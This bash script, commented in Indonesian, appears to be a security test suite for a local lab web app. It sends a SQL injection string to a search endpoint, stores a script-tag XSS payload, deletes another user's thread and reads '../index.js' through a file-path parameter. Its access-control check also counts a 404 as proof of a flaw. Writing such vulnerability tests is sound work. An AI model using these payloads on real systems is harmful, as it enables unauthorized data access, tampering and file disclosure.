#!/bin/bash
# test_functional.sh

# --- Konfigurasi ---
API_URL="http://localhost:3000"
TEST_USER_NAME="tester_bash_sqli"
TEST_USER_EMAIL="devsecops_bash@gamekom.com"
TEST_USER_PASS="securepassword123"
THREAD_ID_BAC=2  # ID Thread milik user lain (asumsi dari seeding)

# --- Variabel Global ---
AUTH_TOKEN=""
CREATED_THREAD_ID=""
STATUS_OK="✅"
STATUS_FAIL="❌"

# --- Utility Functions ---

function url_encode() {
    python -c "import sys, urllib.parse; print(urllib.parse.quote(sys.argv[1]))" "$1" 2>/dev/null
}

# Fungsi untuk mencetak hasil tes
function run_test() {
    local name=$1
    local func=$2
    
    echo -e "\n--- Mulai Tes: $name ---"
    if $func; then
        echo -e "$STATUS_OK Sukses: $name"
    else
        echo -e "$STATUS_FAIL Gagal: $name"
    fi
    echo "---------------------------------"
}

# Fungsi untuk mengekstrak data dari JSON menggunakan JQ
function extract_json() {
    local json_data=$1
    local path=$2
    if [ "$json_data" == "null" ] || [ -z "$json_data" ]; then
        echo "null"
        return
    fi
    echo "$json_data" | jq -r "$path"
}

# --- Test Functions ---

function test_auth_functional() {
    local response
    local http_code

    # 1. Coba Registrasi
    response=$(curl -s -X POST "${API_URL}/auth/register" \
        -H "Content-Type: application/json" \
        -d "{\"username\": \"$TEST_USER_NAME\", \"email\": \"$TEST_USER_EMAIL\", \"password\": \"$TEST_USER_PASS\"}")
    http_code=$(curl -s -o /dev/null -w "%{http_code}" -X POST "${API_URL}/auth/register" \
        -H "Content-Type: application/json" \
        -d "{\"username\": \"$TEST_USER_NAME\", \"email\": \"$TEST_USER_EMAIL\", \"password\": \"$TEST_USER_PASS\"}")
    
    if [ "$http_code" -eq 201 ]; then
        echo "[Auth] Registrasi Sukses (201)."
    elif [ "$http_code" -eq 409 ]; then
        echo "[Auth] User sudah terdaftar (409 Conflict). Melanjutkan ke Login."
    fi

    # 2. Login
    response=$(curl -s -X POST "${API_URL}/auth/login" \
        -H "Content-Type: application/json" \
        -d "{\"email\": \"$TEST_USER_EMAIL\", \"password\": \"$TEST_USER_PASS\"}")
    
    AUTH_TOKEN=$(extract_json "$response" ".token")
    
    if [ -z "$AUTH_TOKEN" ] || [ "$AUTH_TOKEN" == "null" ]; then
        echo "[Auth] Gagal Login. Tidak ada token di respons."
        return 1
    fi
    
    echo "[Auth] Login Sukses. Token: ${AUTH_TOKEN:0:20}..."
    return 0
}

# S-1: A03 SQL Injection (Search) - Menggunakan payload yang lebih andal untuk memutus string
function test_a03_sqli() {
    local payload
    local search_url
    local response
    local thread_count

    # Payload baru: Memutus ' dan menambahkan kondisi OR '1'='1'
    payload="' OR '1'='1 -- " 
    search_url="${API_URL}/threads/search?q=$(echo "$payload" | jq -sRr @uri)"

    # Ambil respons body
    response=$(curl -s "$search_url")
    
    echo "DEBUG: Raw Response untuk SQLi:"
    echo "$response" | head -n 10
    echo "..."

    # Ambil jumlah elemen dari array .data
    thread_count=$(extract_json "$response" ".data | length")
    
    if [ "$thread_count" == "null" ]; then
        echo "[SQLi FAIL] Error parsing JSON. Respons tidak valid."
        return 1
    fi

    echo "Ditemukan $thread_count thread."

    # Kriteria Sukses: Jika mengembalikan banyak data (> 1)
    if [ "$thread_count" -gt 1 ]; then 
        echo "[SQLi VULNERABLE] Kerentanan terkonfirmasi. Query mengabaikan filter dan mengambil $thread_count data."
        return 0
    else
        echo "[SQLi FAIL] Query hanya mengembalikan $thread_count thread. Kerentanan tidak terverifikasi (DB mungkin kosong, atau payload diblokir oleh sintaks error lain)."
        return 1
    fi
}

# S-2: A03 XSS (Thread Creation)
function test_a03_xss() {
    local payload="<script>console.log('XSS_PAYLOAD_ECHO')</script>"
    local response
    local content_check

    # 1. Buat Thread dengan Payload XSS
    response=$(curl -s -X POST "${API_URL}/threads" \
        -H "Content-Type: application/json" \
        -H "Authorization: Bearer $AUTH_TOKEN" \
        -d "{\"title\": \"XSS Test\", \"content\": \"$payload\"}")
    
    CREATED_THREAD_ID=$(extract_json "$response" ".thread.thread_id")
    
    if [ -z "$CREATED_THREAD_ID" ] || [ "$CREATED_THREAD_ID" == "null" ]; then
        echo "[XSS FAIL] Gagal membuat thread. Respons: $response"
        return 1
    fi

    # 2. Verifikasi konten thread
    response=$(curl -s "${API_URL}/threads/$CREATED_THREAD_ID")
    content_check=$(extract_json "$response" ".data.content")

    if [[ "$content_check" == *"<script>console.log('XSS_PAYLOAD_ECHO')</script>"* ]]; then
        echo "[XSS VULNERABLE] Payload tersimpan utuh di database."
        return 0
    else
        echo "[XSS FAIL] Payload tidak tersimpan utuh. Konten tersimpan: ${content_check:0:50}..."
        return 1
    fi
}

# S-3: A01 Broken Access Control (BAC)
function test_a01_bac_horizontal() {
    local http_code

    echo "Target ID milik user lain: $THREAD_ID_BAC"

    # Coba Hapus Thread milik user lain
    http_code=$(curl -s -o /dev/null -w "%{http_code}" -X DELETE "${API_URL}/threads/$THREAD_ID_BAC" \
        -H "Authorization: Bearer $AUTH_TOKEN")
    
    if [ "$http_code" -eq 200 ]; then
        echo "[BAC VULNERABLE] Berhasil menghapus thread $THREAD_ID_BAC milik user lain (Status 200 OK)."
        return 0
    elif [ "$http_code" -eq 404 ]; then
        echo "[BAC VULNERABLE] Thread ID $THREAD_ID_BAC tidak ditemukan (404)."
        echo "   -> Ini mengindikasikan BAC VULNERABLE karena server tidak menggunakan 403, melainkan 404 yang disebabkan oleh data sudah terhapus."
        return 0
    elif [ "$http_code" -eq 403 ]; then
        echo "[BAC AMAN] Server menolak akses (Status 403 Forbidden)."
        return 1
    else
        echo "[BAC FAIL] Status tidak terduga: $http_code. BAC tidak terverifikasi."
        return 1
    fi
}

# S-4: A04 Path Traversal / LFI - FIXED
function test_a04_path_traversal() {
    local payload
    local lfi_url
    local http_code
    local response
    
    # Payload yang dicoba: ../index.js (keluar dari uploads ke root /app)
    # Gunakan url_encode untuk encoding yang benar
    payload="../index.js" 
    encoded_payload=$(url_encode "$payload")
    
    # Menggunakan endpoint yang benar: /posts/file?filePath=...
    lfi_url="${API_URL}/posts/file?filePath=${encoded_payload}"
    
    echo "Mencoba LFI dengan payload: $payload"
    
    # Perintah curl untuk mendapatkan body dan status
    # Kita menggunakan teknik bash untuk memisahkan body dari status code
    exec 3>&1 # Save stdout to fd 3
    http_code=$(curl -s -o >(cat >&3) -w "%{http_code}" "$lfi_url")
    exec 3>&- # Close fd 3 and restore stdout

    # Ambil body response secara penuh (ini mungkin perlu penyesuaian tergantung shell)
    # Karena teknik di atas mungkin rumit, mari kita kembali ke cara 2x curl untuk kejelasan.

    # 1. Ambil HTTP Code
    http_code=$(curl -s -o /dev/null -w "%{http_code}" "$lfi_url")

    # 2. Ambil Body
    response=$(curl -s "$lfi_url")

    echo "DEBUG: HTTP Code: $http_code"
    
    if [ "$http_code" -eq 200 ]; then
        if [[ "$response" == *"import express from \"express\";"* ]] && 
           [[ "$response" == *"app.use(express.json());"* ]]; then
            echo "[LFI VULNERABLE] Berhasil membaca file sistem! ($payload)"
            echo "   -> Konten Awal: ${response:0:100}..."
            return 0
        else
            echo "[LFI FAIL] Mendapat status 200, tapi konten tidak sesuai dengan index.js."
            return 1
        fi
    else
        echo "[LFI FAIL] Server menolak akses atau file tidak ditemukan. Status: $http_code"
        return 1
    fi
}


# --- Eksekusi Semua Test ---

echo "Running Functional and Vulnerability Tests for App2"

# Pastikan Python terinstal untuk url_encode
if ! command -v python &> /dev/null; then
    echo "ERROR: Python tidak ditemukan. Instal python untuk fungsi url_encode."
    exit 1
fi

run_test "F-1: Authentication (Idempotent Login/Register)" test_auth_functional

if [ -n "$AUTH_TOKEN" ] && [ "$AUTH_TOKEN" != "null" ]; then
    # S-1: A03 SQL Injection (Search)
    run_test "S-1: A03 SQL Injection (Search)" test_a03_sqli
    
    # S-2: A03 XSS (Thread Creation)
    run_test "S-2: A03 XSS (Thread & Profile Bio)" test_a03_xss
    
    # S-3: A01 Broken Access Control
    run_test "S-3: A01 BAC (Delete Thread milik user lain)" test_a01_bac_horizontal
    
    # S-4: A04 Path Traversal / LFI
    run_test "S-4: A04 Path Traversal (Get /posts/file)" test_a04_path_traversal
else
    echo -e "\n$STATUS_FAIL Pengujian keamanan dibatalkan karena gagal mendapatkan AUTH_TOKEN."
fi